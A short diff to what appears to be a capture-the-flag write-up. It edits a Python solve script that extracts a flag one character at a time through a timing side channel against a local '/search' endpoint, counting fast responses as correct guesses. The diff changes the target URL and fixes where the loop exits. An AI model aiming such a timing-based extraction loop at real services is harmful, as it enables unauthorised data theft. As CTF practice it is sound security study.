@@ -70,7 +70,7 @@ Hence the final script made to solve the challenge -
 ```python
 import requests
 
-url = "http://localhost:32768/search"
+url = "http://localhost/search"
 flag = ""
 
 charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}"
@@ -80,9 +80,10 @@ while True:
     if(r.elapsed.total_seconds() < 0.8):
       flag += ch
       print(flag)
+      if(ch == '}'):
+        exit()
       break
-    if(ch == '}'):
-      exit()
+
 ```
 [this challenge was solved after the ctf ended]
 
